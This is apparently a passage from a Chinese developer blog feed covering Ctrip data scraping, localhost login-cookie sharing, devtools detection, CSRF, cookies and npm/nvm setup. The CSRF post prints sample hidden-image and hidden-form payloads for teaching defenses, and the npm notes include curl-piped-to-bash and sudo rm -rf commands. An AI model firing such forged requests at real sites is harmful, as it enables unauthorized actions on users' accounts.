&#125;)();</span><br></pre></td></tr></table></figure><p>这样就可以自动翻页，完成时会把我们想要的数据直接console出来。</p><p>然后再找个转csv的工具就可以啦，时间紧张，先发给沙沙吧。</p><h4 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h4><p>虽然这篇的技术知识很简单，可能算不上爬虫，但我们可以回过头来分析下这个例子中携程是如何做反爬的。<br>首页的数据太多太杂，点了第二页，查看了下</p><p><img src="/images/ctrip3.png" alt=""><br>/AjaxHotelList.aspx才是真正的接口，我们需要的数据实际也不是json，而直接是html信息，这样坏人需要写很多的正则来获取，需要懂一些前端知识，而且作恶成本很高。</p><p>这个接口足足有182kb的大小，性能优化和反爬需要有个平衡。</p><p>所以这种数据量比较小的，没有时间要求的，还是从前端的角度来抓取数据会更靠谱一些。</p><p>思考下首页为啥没有这个请求数据的接口呢？</p><p>可能是考虑到首页SEO及渲染速度选择了服务端直出，所以有经验了我们就是应该直奔第二页，明白套路就能少走弯路。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>1.接口返回的并不是规则的json数据，并不好解析，我们可以使用前端的jquery直接获取需要dom属性。</p><p>2.我们使用了chrome的<strong>Snippet</strong>功能，直接在页面中运行代码即可，还可以保存常用的util代码，比直接写在console中会优雅一些。</p><p>3.观察到是单页应用，可以自己写代码来点击切换到下一页。</p><p>4.json如何导出成excel呢？其实我们常用的一般都是csv文件，只要通过tab来分隔就可以了。</p><p>5.读取本地json文件$.getJSON</p><h4 id="思考-1"><a href="#思考-1" class="headerlink" title="思考"></a>思考</h4><p>虽然完成了，得到了技术小白沙沙的赞美，但是心里还是很虚。<br>主要问题有：<br>1.手动的可以全部自动化吗？<br>可以直接写入csv文件而不是copy console里的内容吗？<br>虽然传统的js是运行在浏览器中的，为了安全起见是不可以读写本地文件的，但是发现HTML5有新的API可以导出文件。但是这样还是勉强了些。</p><p>2.沙沙弱弱地说如果可以获取酒店的开业时间和房间数就好了。<br>嗷的，那还得点进去每个酒店的detail去查看，十行代码搞不定啦。<br>我知道可以使用webdriver，phantomJS等来模拟点击，具体的还有待研究。</p><p>不用担心，下篇文章我们会鸟枪换炮！</p><h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>只需要很少的代码量就可以达到我们的需求，js真的很强大呢！前端很好玩，能把前端用在生活中那就更美妙了，可以抢火车票啥的。</p><p>心虚的说了句要赶紧学python啦。另一只小白问要怎么才能学会编程，学了几天python没有动力就不想学了。</p><p>我觉得用一劳永逸的懒人思维思考问题，慢慢自己给自己提需求，这样就能发现科技的力量和智趣。</p>]]></content>
      
      
      
        <tags>
            
            <tag> puppeteer </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>「 效率 」前后端分离项目的本地代理及登录态绕过</title>
      <link href="/2019/01/05/proxy_login_state/"/>
      <url>/2019/01/05/proxy_login_state/</url>
      
        <content type="html"><![CDATA[<p>在开发新需求或者复现bug时，前端经常会通过代理工具将被本地修改的js，css代理到线上，这样可以不用一次一次的上线测试，在本地就可以随改随生效。</p><p>vue项目可以 <code>npm run serve</code> 本地跑起来，开发阶段接口调试时，最好能把所有localhost的本地接口全代理到【线上】，有很多方法。</p><a id="more"></a><h4 id="绕过跨域限制的方法"><a href="#绕过跨域限制的方法" class="headerlink" title="绕过跨域限制的方法"></a>绕过跨域限制的方法</h4><ol><li><p>使用vue-cli中默认带的http-proxy-middleware，具体配置参见<a href="https://github.com/chimurai/http-proxy-middleware" target="_blank" rel="noopener">http-proxy-middleware</a> 文档。</p></li><li><p>使用代理工具，fiddler 或 Charles设置cors。</p></li><li><p>使用chrome插件Allow-Control-Allow-Origin: *</p></li><li><p>让后端开启cors（尽量自给自足）。</p></li></ol><h4 id="如何绕过登录"><a href="#如何绕过登录" class="headerlink" title="如何绕过登录"></a>如何绕过登录</h4><p>但是遇到登录这个拦路虎，localhost下因为没有登录态，每次请求全部401，不能本地调试，代理完全都没用了。</p><p>后来同事分享了一个鸡贼的方法，真是个小机灵鬼~</p><p>以evacoder.com为例，因为登录态通过cookie来标志的，而此cookie下发在<code>evacoder.com</code>域下</p><p>怎么才能让localhost共享到登录态呢？</p><p>比如我npm run serve在localhost:8080，此项目需要登录态，我们可以配置host</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 test.evacoder.com</span><br></pre></td></tr></table></figure><p>如果登录态的cookie不带点，也就是说子域不可访问，我们可以手动的chrome dev tool=&gt;Application=&gt;cookies下给它加个点。</p><p>这样我们测试的时候在evacoder登录之后下发了登录态，因为有代理，访问localhost:8080可以改为访问test.evacoder.com:8080就可以共享到登录态了。</p><p>少年你忘了还有丑陋的8080端口号吗？端口号不一样也是跨域的，那咋办呢？</p><p>我们还有大招nginx反向代理，nginx用处多多，此处只说怎么完成我们的需求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  localhost;</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass    http://127.0.0.1:8080;</span><br><span class="line">        root   html;</span><br><span class="line">        index  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将localhost:8080代理到localhost:80端口，80端口是默认端口，这样就可以不需要丑陋的端口直接访问了。</p><h4 id="简化"><a href="#简化" class="headerlink" title="简化"></a>简化</h4><p>为啥要这么麻烦呢？平常调试时不也就是用fiddler把线上的文件直接代理到本地就可以了么？</p><p>因为 <code>npm run serve</code> 生成的文件放在内存中，并没有实际的路径，但是我们还是可以使用 fiddler 通过autoresponse中使用正则来完成批量代理</p><p>只需将 <code>REGEX:https://evacoder.com/(.*)$</code> 代理到 <code>http://localhost:8080/$1</code> 即可。当然我们需要只代理静态文件，剔除api的代理。</p><p>虽然这样webpack HMR就没办法直接本地即改即生效了，但是我们还有办法，sublime上的livereload插件配合chrome上的livereload，保存文件时无脑刷新，虽然傻办法，但是还是可以节省点时间。</p><p>这样在开发过程中也可以开心的代理到线上即改即生效了~虽然功能很简单但是探索的过程很有趣，社会的发展都是懒人推动的哈哈哈。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Tool </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>JS检测是否打开了控制台（devtool）</title>
      <link href="/2018/12/28/js_devtool/"/>
      <url>/2018/12/28/js_devtool/</url>
      
        <content type="html"><![CDATA[<p>JS并没有直接提供判断检测用户是否打开devtool的API。<br>思考下，打开控制台有哪些特征呢？<br><a id="more"></a></p><p>1.按键类，用户按下了F12，cmd+i+u,右键选择审查元素等</p><p>但是打开devtool并不能用一种操作模式就能完全涵盖，不同操作系统下的键盘特征也不一样。</p><p>2.窗口宽度变化类，内部宽度变窄</p><p>Github上搜到这个 devtools-detect 只通过宽度检测加上直观的demo就可以拿到800+的stars哦。</p><p>核心代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> threshold = <span class="number">160</span>;</span><br><span class="line">setInterval(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> widthThreshold = <span class="built_in">window</span>.outerWidth - <span class="built_in">window</span>.innerWidth &gt; threshold;</span><br><span class="line">    <span class="keyword">var</span> heightThreshold = <span class="built_in">window</span>.outerHeight - <span class="built_in">window</span>.innerHeight &gt; threshold;</span><br><span class="line">    <span class="keyword">var</span> orientation = widthThreshold ? <span class="string">'vertical'</span> : <span class="string">'horizontal'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(heightThreshold &amp;&amp; widthThreshold) &amp;&amp;</span><br><span class="line">      ((<span class="built_in">window</span>.Firebug &amp;&amp; <span class="built_in">window</span>.Firebug.chrome &amp;&amp; <span class="built_in">window</span>.Firebug.chrome.isInitialized) || widthThreshold || </span><br><span class="line">      heightThreshold)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!devtools.open || devtools.orientation !== orientation) &#123;</span><br><span class="line">            emitEvent(<span class="literal">true</span>, orientation);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        devtools.open = <span class="literal">true</span>;</span><br><span class="line">        devtools.orientation = orientation;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (devtools.open) &#123;</span><br><span class="line">            emitEvent(<span class="literal">false</span>, <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        devtools.open = <span class="literal">false</span>;</span><br><span class="line">        devtools.orientation = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, <span class="number">500</span>);</span><br></pre></td></tr></table></figure><p>主要思路是：一直500ms的间隔来监控是否出现内外宽高度差&gt;160的情况，基本的场景都可以覆盖，除了将调试窗口从页面中拖出来的情况。虽然思路很简单，但是人家的测试用例全呀！</p><p>不得不说确实很有效，但我们可以升级下，<strong>将setInterval改为window.onresize</strong>，性能上应该会好很多<br>TODO补充代码</p><p>3.特殊特征类<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> re = <span class="regexp">/x/</span>;</span><br><span class="line">  <span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(re);</span><br><span class="line"></span><br><span class="line">  re.toString = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// console.log(i);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'第 '</span> + (++i) + <span class="string">' 次打开控制台'</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.console &amp;&amp; <span class="built_in">window</span>.console.log) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"打开了控制台"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>参考 </p><p><a href="https://stackoverflow.com/questions/7798748/find-out-whether-chrome-console-is-open" target="_blank" rel="noopener">https://stackoverflow.com/questions/7798748/find-out-whether-chrome-console-is-open</a></p><p><a href="https://github.com/sindresorhus/devtools-detect" target="_blank" rel="noopener">https://github.com/sindresorhus/devtools-detect</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>「 安全 」这次，完全弄明白CSRF</title>
      <link href="/2018/12/20/crsf/"/>
      <url>/2018/12/20/crsf/</url>
      
        <content type="html"><![CDATA[<p>今天听小伙伴分享了下CSRF攻击的原理，这次真的弄明白了CSRF。<br><strong>CSRF(</strong>Cross Site Request Forgery) 是什么？跨站请求伪造。</p><p>通过CSRF攻击，坏人可以冒用你的身份（登录态）来做任何事情。因为登录态一般都是通过cookie来存储在浏览器中，要知道即使只是发起一个图片的请求，也会带上这个域下的所有cookie，可以做到用户完全无感知的情况下发起用户不想发出的请求。<br><a id="more"></a></p><h4 id="为啥钱被转走了"><a href="#为啥钱被转走了" class="headerlink" title="为啥钱被转走了"></a>为啥钱被转走了</h4><p>假设mi有个付钱的接口是 <code>api.mi.com/pay?money=10000&amp;x=xx</code></p><p>要知道一般登录态（serviceToken）都是存在浏览器的cookie中，有的有效期还很长，如果有一个坏人的页面<code>badman.com</code>，页面中加载一个看不见的小图片</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">wwww.mi.com/pay?money</span>=<span class="string">10000</span> <span class="attr">style</span>=<span class="string">"display:none"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>只要我们访问这个页面，就会在我们不知情的情况下自动发请求 <code>api.mi.com/pay?money=10000</code>出去，虽然只是一个图片，一样会带上存在你浏览器中的 <code>mi.com</code>下的所有的cookie，如果这时候你已经登录了mi网，这个请求就轻松的得到了你的登录态，向服务器发出了付款的请求。坏人setInterval每秒发个请求，你的钱就哗哗的全被转走了。</p><p>一般作恶的核心是<strong>跨域</strong>，所以浏览器对于跨域有很多限制。</p><p>但是我们都知道这种通过ping img 图片跨域的方式发起的是<strong>get请求</strong>，只管请求发出去，而不管响应。<br>get请求一般只是读取操作，像付款这种写操作如果还使用get请求，第一步就被人吃干抹净，所以在接口设计中一定要注意。<br>现在我们将 <code>api.mi.com/pay?money=10000</code> 升级为post请求，如果有坏人访问就统统405，现在就可以高枕无忧了吗？</p><p><strong>post请求可以跨域吗？</strong></p><p>ajax有跨域限制，但是通过form表单的方式，post请求一样可以跨域，再加上放在iframe里，还可以不跳转页面就发送表单post请求，用户毫无感知钱就被转走了。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span></span><br><span class="line">　<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span>　<span class="attr">action</span>=<span class="string">"http://api.mi.com"</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"other"</span> <span class="attr">value</span>=<span class="string">"XXX"</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"money"</span> <span class="attr">value</span>=<span class="string">"10000"</span>&gt;</span></span><br><span class="line">　<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="防御CRSF"><a href="#防御CRSF" class="headerlink" title="防御CRSF"></a>防御CRSF</h4><ul><li>删改查操作使用post method是基础。</li><li><p>一般的做法是随着登录态下发一个 <code>crsf_token</code>，在之后所有post操作中都要求带上这个 <code>crsf_token</code>，axios有这个功能，不需要我们手动每次添加。 这种做法的原理是在坏人的页面中，虽然可以自动带上被攻击网站的cookie，但是他的代码在 <code>badman.com</code> 下，因为cookie的同源策略，他通过js是无法获取在mi.com域下的crsf_token cookie放在post 请求中的，crsf_token是个随机字符串都可以达到这个效果。</p></li><li><p>也可以在敏感操作中通过后端校验refer，通过refer白名单的方式来杜绝来自坏人网站的攻击。</p></li><li><p>在非常敏感的操作中可以（最好不要）牺牲一些体验要求验证码验证，要求用户必须有交互。</p></li><li><p>最好严格下发子域的cookie，避免全站通用的cookie。</p></li></ul><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>为啥只在post请求下使用 <code>crsf_token</code>呢？</p><p>之前回答post和get的区别的时候都回答的很浅，但是在这个场景下，安全无小事，你就能理解两者的区别了。</p><p>get请求你要加 <code>crsf_token</code>其实也没问题吧，只不过一般get请求是读取操作，不会修改服务器数据，一般没啥影响，不加验证也还好，毕竟加token会影响性能。一个合格的后端开发应该不会用get请求来敏感操作的，如果有，你可以教训教训他。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>「 缓存 」cookie实践指南</title>
      <link href="/2018/12/20/cookie/"/>
      <url>/2018/12/20/cookie/</url>
      
        <content type="html"><![CDATA[<p>HTTP是无状态的协议，cookie可以用来存储用户的信息方便追踪。<br><a id="more"></a></p><h4 id="封装cookie操作"><a href="#封装cookie操作" class="headerlink" title="封装cookie操作"></a>封装cookie操作</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCookie</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> cookieName = <span class="string">`<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(name)&#125;</span>=`</span>;</span><br><span class="line">  <span class="keyword">const</span> cookieStart = <span class="built_in">document</span>.cookie.indexOf(cookieName);</span><br><span class="line">  <span class="keyword">let</span> cookieValue = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">if</span> (cookieStart &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> cookieEnd = <span class="built_in">document</span>.cookie.indexOf(<span class="string">';'</span>, cookieStart);</span><br><span class="line">    <span class="keyword">if</span> (cookieEnd === <span class="number">-1</span>) &#123;</span><br><span class="line">      cookieEnd = <span class="built_in">document</span>.cookie.length;</span><br><span class="line">    &#125;</span><br><span class="line">    cookieValue = <span class="built_in">document</span>.cookie.substring(cookieStart + cookieName.length, cookieEnd);</span><br><span class="line">    cookieValue = <span class="built_in">decodeURIComponent</span>(cookieValue);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> cookieValue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setCookie</span>(<span class="params">name, value, expires, path, domain, secure</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> cookieText = <span class="string">`<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(name)&#125;</span>=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(value)&#125;</span>`</span>;</span><br><span class="line">  <span class="keyword">if</span> (expires) &#123;</span><br><span class="line">    cookieText += <span class="string">`;expires=<span class="subst">$&#123;expires.toUTCString()&#125;</span>`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (path) &#123;</span><br><span class="line">    cookieText += <span class="string">`;path=<span class="subst">$&#123;path&#125;</span>`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (domain) &#123;</span><br><span class="line">    cookieText += <span class="string">`;domain=<span class="subst">$&#123;domain&#125;</span>`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (secure) &#123;</span><br><span class="line">    cookieText += <span class="string">';secure'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">document</span>.cookie = cookieText;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delCookie</span>(<span class="params">name, path, domain, secure</span>) </span>&#123;</span><br><span class="line">  setCookie(name, <span class="string">''</span>, <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">0</span>), path, domain, secure);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从setCookie来看，每个参数都暗藏玄机。</p><ul><li>name和value</li></ul><p>name和value自不必多说，cookie是存储的一个个键值对，name和value都需要encode之后存储，如果没有encode会怎么样呢？</p><p>在chrome中试验<code>document.cookie=&#39;%ddd=2=%#&amp;试试中文&#39;</code>依然可以设置cookie成功，读取时也可以读取到，但是为了规范存取，还是需要encode之后再读写。</p><ul><li>expires</li></ul><p>如果不设置expires，会得到<strong>session级别的cookie</strong>。一定要注意，session的定义是把<strong>整个浏览器关闭</strong>之后，这些cookie才会消失，而不是仅仅关闭所在的tab页。</p><ul><li>path</li></ul><p>如果不设置path的话，得到的cookie的path会是当前页面的path哦。比如在<code>eva.com/blog/page/1.html</code>中设置cookie，不设置path，得到的cookie的path会是<code>/blog/page/</code></p><ul><li>domain</li></ul><p>仔细观察可以发现，cookie中的domain有的是带点的比如<code>.eva.com</code>，有的是不带点的<code>eva.com</code>。它们的区别是什么？又是怎么设置成功的呢？</p><p><code>eva.com</code>和<code>.eva.com</code>的区别</p><p>cookie也符合<strong>同源策略</strong>，带点的表示子域如<code>account.eva.com</code>也可以访问，而不带点的要求严格，只能在本域名中访问。</p><p>如果不设置domain的话，就默认是当前不带点的域名。如果设置域名的话，会下发在带点的域名下，子域也可以共享cookie。</p><p>比如在<code>eva.com/blog/page/1.html</code>中设置cookie，不设置domain，得到的cookie的path会是eva.com，<code>setCookie(&#39;key&#39;,&#39;value&#39;,new Date(),&#39;/&#39;,&#39;eva.com&#39;)</code>设置了domain的话，会自动加上.变成<code>.eva.com</code>。</p><p>后端下发的cookie也同理，看是否设置域名。</p><p>带不带点需要视情况而定，看是否允许子域获取到cookie。</p><h4 id="cookie的使用场景"><a href="#cookie的使用场景" class="headerlink" title="cookie的使用场景"></a>cookie的使用场景</h4><p>1.登录态的记录</p><p>sso登录中需要用cookie来记录用户的登录态</p><p>2.已阅读标识</p><p>对于只出现一次的用户协议，我们需要一个已阅读的标识，这个时候其实可以不需要后端，前端设置一个cookie来作为已经出现过的标识。</p><p>其他待补充</p><h4 id="遇到的那些问题"><a href="#遇到的那些问题" class="headerlink" title="遇到的那些问题"></a>遇到的那些问题</h4><p>1.cookie大小的问题</p><p>有的时候后端为了全面追溯用户的状态下，发的cookie非常大，注意一般浏览器的cookie大小限制是4kb左右，保险起见最好不要超过4kb。过大的cookie会下发不成功，遇到问题不好定位。</p><p>有时候运维也会在ngnix对cookie设置大小限制，一般比4kb还小，这个时候问题就更难定位了，可以作为一个排查点。</p><p>另外过大的cookie还会造成严重的性能问题。一般没有特别做性能优化的网站js/css/img等静态资源都和接口共用一个域名，域名下如果有很多的cookie的话，每次获取静态资源时这些cookie也会带在了请求中，虽然有4kb的限制，但是还是会造成不必要的网络开销，如果条件允许，建议启动<strong>和主站不同的域名来放置静态资源</strong>。虽然采用不同的域名导致多次建立网络连接，会多耗费时间，可以权衡一下采用哪种方案。</p><p>和server端强调下最好不要下发没必要的cookie，注意cookie的大小。</p><p>2.cookie标志用户，用户切换时要注意避免cookie污染。</p><p>使用cookie进行交互时一定要注意各个用户切换时造成的问题。一定能覆盖成功才可以</p><p>3.熟练使用抓包工具避免推诿</p><p>chrome中network的追溯</p><p>一旦涉及到cookie的问题，特别是webview中的cookie，需要iOS，andriod，FE，server端一起来定位问题，这个时候非常需要一个工具来确定到底谁是罪魁祸首。熟练使用抓包工具会避免推诿，省心不少。</p><p>一定要看清楚到底是response cookie和request cookie，明确cookie是在哪个请求中下发的。</p>]]></content>
      
      
      
        <tags>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>npm常用命令一网打尽</title>
      <link href="/2018/11/30/npm/"/>
      <url>/2018/11/30/npm/</url>
      
        <content type="html"><![CDATA[<p>npm笔记，纯粹记录下，哪天电脑坏了快速重装一遍不走弯路。<br><a id="more"></a></p><h4 id="nvm-管理-node-版本"><a href="#nvm-管理-node-版本" class="headerlink" title="nvm 管理 node 版本"></a>nvm 管理 node 版本</h4><p>首先先把全局安装的 packages 记录下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出所有全局安装 package</span></span><br><span class="line">npm ls -g --depth=0</span><br></pre></td></tr></table></figure><p>/Users/eva/.nvm/versions/node/v10.15.3/lib<br>├── @<a href="mailto:vue/cli@3.5.2" target="_blank" rel="noopener">vue/cli@3.5.2</a><br>├── <a href="mailto:eslint@5.15.3" target="_blank" rel="noopener">eslint@5.15.3</a><br>├── <a href="mailto:express@4.16.4" target="_blank" rel="noopener">express@4.16.4</a><br>├── <a href="mailto:gulp-cli@2.1.0" target="_blank" rel="noopener">gulp-cli@2.1.0</a><br>├── <a href="mailto:hexo-cli@1.1.0" target="_blank" rel="noopener">hexo-cli@1.1.0</a><br>├── <a href="mailto:npm@6.9.0" target="_blank" rel="noopener">npm@6.9.0</a><br>├── <a href="mailto:nrm@1.1.0" target="_blank" rel="noopener">nrm@1.1.0</a><br>├── <a href="mailto:webpack@4.29.6" target="_blank" rel="noopener">webpack@4.29.6</a><br>├── <a href="mailto:webpack-cli@3.3.0" target="_blank" rel="noopener">webpack-cli@3.3.0</a><br>└── <a href="mailto:yo@2.0.5" target="_blank" rel="noopener">yo@2.0.5</a></p><p>然后把原来全局安装的 node 删掉，反正以后也不用了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除全局安装的 package</span></span><br><span class="line">sudo rm -rf /usr/<span class="built_in">local</span>/lib/node_modules</span><br><span class="line"><span class="comment"># 删除 node</span></span><br><span class="line">sudo rm /usr/<span class="built_in">local</span>/bin/node</span><br><span class="line"><span class="comment"># 删除全局 node 模块注册的软链</span></span><br><span class="line"><span class="built_in">cd</span>  /usr/<span class="built_in">local</span>/bin &amp;&amp; ls -l | grep <span class="string">"../lib/node_modules/"</span> | awk <span class="string">'&#123;print $9&#125;'</span>| xargs rm</span><br></pre></td></tr></table></figure><p>安装 nvm</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.8/install.sh | bash</span><br></pre></td></tr></table></figure><p>修改环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> NVM_DIR=<span class="string">"<span class="variable">$HOME</span>/.nvm"</span></span><br><span class="line">[ -s <span class="string">"<span class="variable">$NVM_DIR</span>/nvm.sh"</span> ] &amp;&amp; . <span class="string">"<span class="variable">$NVM_DIR</span>/nvm.sh"</span></span><br></pre></td></tr></table></figure><p>查看手册</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出所有命令</span></span><br><span class="line">nvm -h</span><br><span class="line"><span class="comment"># 安装最新Long-term-support版</span></span><br><span class="line">nvm install --lts</span><br><span class="line"><span class="comment"># 比如10.5.3</span></span><br><span class="line">nvm use 10.5.3</span><br></pre></td></tr></table></figure><p>LTS是基础库的开发者对库的使用者的一个承诺，保证某个版本的库发布之后的很长一段事件之内都得到支持。如果此版本发现一些紧急问题需要修复，那么就会在这个版本上进行更新。通常这些问题的修复都不会导致 API 变化（API 保证长期兼容），所以版本号的前两位是不变的，通常只变化第三位。</p><h4 id="安装全局-package"><a href="#安装全局-package" class="headerlink" title="安装全局 package"></a>安装全局 package</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm i -g @vue/cli eslint express nrm webpack webpack-cli gulp</span><br><span class="line"><span class="comment"># 自己安装自己来更新 npm</span></span><br><span class="line">npm i -g npm</span><br></pre></td></tr></table></figure><p>一般不要随便切换 node 版本，如果要切换，记得把全局安装的 packge 重新安装在那个 node 版本下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvm install v12.0.0 --reinstall-packages-from=8.0.0</span><br></pre></td></tr></table></figure><h4 id="nrm-管理-npm-源"><a href="#nrm-管理-npm-源" class="headerlink" title="nrm 管理 npm 源"></a>nrm 管理 npm 源</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nrm ls</span><br><span class="line">nrm use cnpm</span><br></pre></td></tr></table></figure><p>  npm —- <a href="https://registry.npmjs.org/" target="_blank" rel="noopener">https://registry.npmjs.org/</a></p><p>* cnpm — <a href="http://r.cnpmjs.org/" target="_blank" 